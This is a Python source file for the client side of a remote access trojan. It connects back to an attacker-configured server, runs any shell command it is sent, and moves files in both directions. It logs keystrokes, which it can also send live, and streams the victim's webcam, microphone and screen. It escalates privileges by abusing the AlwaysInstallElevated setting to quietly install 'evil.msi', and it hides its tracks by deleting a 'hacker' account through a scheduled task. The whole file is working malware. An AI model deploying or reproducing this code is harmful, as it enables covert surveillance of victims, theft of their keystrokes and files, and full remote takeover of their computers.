import socket  # For network communication
import time  # For adding delays
import subprocess  # For running shell commands
import json  # For encoding and decoding data in JSON format
import os  # For interacting with the operating system
from pynput.keyboard import Listener  # For capturing keyboard events
import re
import pyaudio
import threading
import pickle
import cv2
import struct
from PIL import ImageGrab
import numpy as np
from dotenv import load_dotenv

# Function to send data in a reliable way (encoded as JSON)
def reliable_send(data):
    jsondata = json.dumps(data)     # Convert data to JSON format
    s.send(jsondata.encode())       # Send the encoded data over the network

# Function to receive data in a reliable way (expects JSON data)
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()  # Receive data in chunks and decode
            return json.loads(data)  # Parse the received JSON data
        except ValueError:
            continue

# Function to establish a connection to a remote host
def connection():
    while True:
        time.sleep(5)  # Wait for 10 seconds before reconnecting (for resilience)
        try:
            # Connect to a remote host with IP '192.168.1.43' and port 5555
            s.connect((SERVER_IP, CONTROL_PORT))
            # Once connected, enter the shell() function for command execution
            shell()
            # Close the connection when done
            s.close()
            break
        except:
            # If a connection error occurs, retry the connection
            connection()

# Function to upload a file to the remote host
def upload_file(file_name):
    f = open(file_name, 'rb')       # Open the specified file in binary read mode
    s.send(f.read())                # Read and send the file's contents over the network

# Function to download a file from the remote host
def download_file(file_name):
    f = open(file_name, 'wb')       # Open a file for binary write mode
    s.settimeout(1)                 # Set a timeout for receiving data
    chunk = s.recv(1024)            # Receive data in chunks of 1024 bytes
    while chunk:
        f.write(chunk)              # Write the received data to the file
        try:
            chunk = s.recv(1024)    # Receive the next chunk
        except socket.timeout as e:
            break
    s.settimeout(None)              # Reset the timeout setting
    f.close()                       # Close the file when done


def start_keylogging(filename):
    global keylogger_listener  # Use a global variable to manage the keylogger listener

    def write_to_file(key):
        with open(filename, 'a') as f:
            letter = str(key)
            letter = letter.replace("'", "")
            letter = letter.replace("Key.space", " ")
            letter = letter.replace("Key.backspace", " [BACKSPACE] ")
            letter = letter.replace("Key.enter", "\n[ENTER]\n")
            letter = letter.replace("Key.tab", "\n[TAB]\n")
            letter = letter.replace("Key.shift", "\n[SHIFT]\n")
            letter = letter.replace("Key.ctrl_l", "\n[CTRL]\n")
            letter = letter.replace("Key.ctrl_r", "\n[CTRL]\n")
            letter = letter.replace("Key.alt_l", "\n[ALT]\n")
            letter = letter.replace("Key.alt_r", "\n[ALT]\n")
            letter = letter.replace("Key.Caps_Lock", "")
            letter = letter.replace("Key.tab", "\n[TAB]\n")

            f.write(letter)

    keylogger_listener = Listener(on_press=write_to_file)   # Create a listener for key events
    keylogger_listener.start()                              # Start the listener to capture key events
    print(f'[+] Keylogging started: {filename}')


def stop_keylogging():
    global keylogger_listener, keylogging_filename              # Use the global variable to stop the listener
    filename = keylogging_filename

    keylogger_listener.stop()

    upload_file(filename)                                       # Upload the keylog file to the remote host
    os.remove(filename)                                         # Remove the keylog file from the local system
    keylogging_filename = None


def keylogging_live():
    global keylogger_listener, keylogging_filename, livekeylogging_status

    def send_live_keylog(key):
        reliable_send(str(key))

    def write_livekeylog_to_file(key,filename):
        with open(filename, 'a') as f:
            letter = str(key)
            letter = letter.replace("'", "")
            letter = letter.replace("Key.space", " ")
            letter = letter.replace("Key.backspace", " [BACKSPACE] ")
            letter = letter.replace("Key.enter", "\n[ENTER]\n")
            letter = letter.replace("Key.tab", "\n[TAB]\n")
            letter = letter.replace("Key.shift", "\n[SHIFT]\n")
            letter = letter.replace("Key.ctrl_l", "\n[CTRL]\n")
            letter = letter.replace("Key.ctrl_r", "\n[CTRL]\n")
            letter = letter.replace("Key.alt_l", "\n[ALT]\n")
            letter = letter.replace("Key.alt_r", "\n[ALT]\n")
            letter = letter.replace("Key.Caps_Lock", "")
            letter = letter.replace("Key.tab", "\n[TAB]\n")

            f.write(letter)

    def on_press_functions(key):
        global keylogging_filename

        send_live_keylog(key)
        if keylogging_filename != None:
            write_livekeylog_to_file(key, keylogging_filename)

    keylogger_listener = Listener(on_press=on_press_functions)
    keylogger_listener.start()

    stop_listener = threading.Thread(target=listen_for_livekeylogging_stop, daemon=False)
    stop_listener.start()

    print(f'[+] Live keylogging started')

    while livekeylogging_status:
        pass


def listen_for_livekeylogging_stop():
    global livekeylogging_status, keylogger_listener, keylogging_filename

    while livekeylogging_status:
        try:
            command = reliable_recv()
            if command[:20] == 'keylogging_live_stop':
                keylogger_listener.stop()
                print("[+] Stopping live keylogging...")
                livekeylogging_status = False
                reliable_send("end of keylogging")

                if keylogging_filename != None:
                    try:
                        upload_file(keylogging_filename)
                        print(f"[+] Successfully upload the previous live keylogging session file as {keylogging_filename}")
                    except:
                        print(f"[-] Fail to upload the previous live keylogging session file")

                    # reliable_send("end of keylogging")
                    os.remove(keylogging_filename)
                    keylogging_filename = None
                    keylogger_listener = None
                    break
 
                # reliable_send("end of keylogging")
                keylogger_listener = None
                break
        except:
            continue


def check_always_install_elevated():
    cmd = (
        'reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & '
        'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'
    )
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = proc.stdout.read() + proc.stderr.read()
    result = result.decode(errors='ignore')
    enabled = result.count('0x1')
    if enabled >= 2:
        reliable_send("[+] AIE is ENABLED\n" + result)
    else:
        reliable_send("[-] AIE is DISABLED\n" + result)


def run_evil_msi():
    try:
        subprocess.call("msiexec /quiet /qn /i evil.msi", shell=True)
        reliable_send("[+] evil.msi executed successfully.")
    except Exception as e:
        reliable_send(f"[-] Execution failed: {str(e)}")


def delete_hacker_user():
    try:
        command = 'schtasks /create /tn deleteHacker /tr "cmd.exe /c net user hacker /del" /sc once /st 00:00 /ru hacker /rp Pass1234 /f'
        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        command = 'schtasks /run /tn deleteHacker'
        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read()
        reliable_send(result.decode())
    except Exception as e:
        reliable_send(f"[-] Failed to delete user: {str(e)}")


def start_video_stream():
    global video_stream_active
    video_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        video_socket.connect((SERVER_IP, VIDEO_PORT))
    except ConnectionRefusedError:
        print("[-] Video server connection refused.")
        video_stream_active = False
        return

    cap = cv2.VideoCapture(0)
    print("[*] Video streaming started...")
    while video_stream_active:
        ret, frame = cap.read()
        if not ret: break
        frame_data = pickle.dumps(frame)
        message_size = struct.pack("L", len(frame_data))
        try:
            video_socket.sendall(message_size + frame_data)
        except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
            break
    
    print("[*] Video streaming stopped.")
    cap.release()
    video_socket.close()
    video_stream_active = False


def start_audio_stream():
    global audio_stream_active
    audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        audio_socket.connect((SERVER_IP, AUDIO_PORT))
    except ConnectionRefusedError:
        print("[-] Audio server connection refused.")
        audio_stream_active = False
        return

    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
    
    print("[*] Audio streaming started...")
    while audio_stream_active:
        try:
            data = stream.read(1024)
            audio_socket.sendall(data)
        except (ConnectionResetError, BrokenPipeError, IOError, ConnectionAbortedError):
            break

    print("[*] Audio streaming stopped.")
    stream.stop_stream()
    stream.close()
    p.terminate()
    audio_socket.close()
    audio_stream_active = False


def start_screen_stream():
    global screen_stream_active
    screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        screen_socket.connect((SERVER_IP, SCREEN_PORT))
    except ConnectionRefusedError:
        print("[-] Screen server connection refused.")
        screen_stream_active = False
        return
    
    def capture_screen():
        """Capture screen and convert to OpenCV format"""
        # Capture screen using PIL
        screenshot = ImageGrab.grab()
        
        # Convert PIL image to OpenCV format
        screenshot_np = np.array(screenshot)
        screenshot_cv = cv2.cvtColor(screenshot_np, cv2.COLOR_RGB2BGR)
        
        # Resize for faster transmission (optional)
        height, width = screenshot_cv.shape[:2]
        new_width = 1024
        new_height = int(height * (new_width / width))
        screenshot_resized = cv2.resize(screenshot_cv, (new_width, new_height), interpolation=cv2.INTER_LANCZOS4)
    
        return screenshot_resized

    print("[+] start live streaming screen")
    while screen_stream_active:
        try:
            # Capture screen
            frame = capture_screen()
            
            encode_params = [
                cv2.IMWRITE_JPEG_QUALITY, 80,
                cv2.IMWRITE_JPEG_OPTIMIZE, 1,
                cv2.IMWRITE_JPEG_PROGRESSIVE, 1,
            ]

            # Encode frame as JPEG for compression
            _, buffer = cv2.imencode('.jpg', frame, encode_params)
            
            # Serialize the frame
            data = pickle.dumps(buffer)
            
            # Send frame size first
            frame_size = struct.pack("L", len(data))
            screen_socket.sendall(frame_size)
            
            # Send frame data
            screen_socket.sendall(data)
            
            # Control frame rate
            time.sleep(0.05)  # ~20 FPS
            
        except Exception as e:
            print(f"Error sending frame: {e}")
            screen_stream_active = False
            break

    screen_socket.close()


def shell():
    global keylogger_status, keylogging_filename, livekeylogging_status, video_stream_active, audio_stream_active, screen_stream_active
    print("you have been hacked, be careful!")

    while True:
        print("ready for command")
        # Receive a command from the remote host
        command = reliable_recv()
        if command == 'quit':
            break

        elif command == 'clear':
            pass

        elif command == 'menu':
            pass

        elif command[:3] == 'cd ':
            os.chdir(command[3:])

        elif command[:8] == 'download':
            upload_file(command[9:])

        elif command[:6] == 'upload':
            download_file(command[7:])

        elif command[:16] == 'keylogging_start':
            filename = re.sub(r'[\\/:*?"<>|]', '', command[17:]).replace(' ', '')  # clean the filename to avoid invalid characters

            if not keylogger_status:
                keylogging_filename = filename if (len(command) > 17 and filename != "") else 'keylog.txt' # Default filename if not specified
                start_keylogging(keylogging_filename)
                keylogger_status = True
            else:
                pass

        elif command[:15] == 'keylogging_stop':
            if keylogger_status:
                stop_keylogging()
                keylogger_status = False
            else:
                pass

        elif command[:15] == 'keylogging_live':
            if not livekeylogging_status:
                filename = re.sub(r'[\\/:*?"<>|]', '', command[16:]).replace(' ', '')

                if len(command) > 16:
                    if filename != "None":
                        keylogging_filename = filename if (filename != "") else 'keylog.txt'
                    else:
                        keylogging_filename = None

                livekeylogging_status = True
                print(keylogging_filename)
                keylogging_live()
            else:
                pass

        elif command == 'check_aie':
            check_always_install_elevated()

        elif command == 'run_evil_msi':
            run_evil_msi()
            
        elif command == 'delete_hacker_user':
            delete_hacker_user()

        elif command == 'stream_start_audio':
            if not audio_stream_active:
                audio_stream_active = True
                threading.Thread(target=start_audio_stream, daemon=True).start()

        elif command == 'stream_start_screen':
            if not screen_stream_active:
                print("ok")
                screen_stream_active = True
                threading.Thread(target=start_screen_stream, daemon=True).start()

        elif command == 'stream_start_video':
            if not video_stream_active:
                video_stream_active = True
                threading.Thread(target=start_video_stream, daemon=True).start()

        elif command == 'stream_stop_audio':
            audio_stream_active = False

        elif command == 'stream_stop_screen':
            screen_stream_active = False

        elif command == 'stream_stop_video':
            video_stream_active = False

        else:
            # For other commands, execute them using subprocess
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()  # Capture the command's output
            result = result.decode()  # Decode the output to a string
            # Send the command execution result back to the remote host
            reliable_send(result)

#downlaod dotenv file for initialize program configuration
load_dotenv()

SERVER_IP = str(os.getenv("HOST_IP"))
CONTROL_PORT = int(os.getenv("CONTROL_PORT"))
VIDEO_PORT = int(os.getenv("VIDEO_PORT"))
AUDIO_PORT = int(os.getenv("AUDIO_PORT"))
SCREEN_PORT = int(os.getenv("SCREEN_PORT"))

video_stream_active, audio_stream_active, screen_stream_active = False, False, False

keylogger_status, livekeylogging_status = False, False

keylogging_filename = None # Default filename for keylogging

keylogger_listener = None  # Initialize the keylogger listener variable

# Create a socket object for communication over IPv4 and TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Start the connection process by calling the connection() function
connection()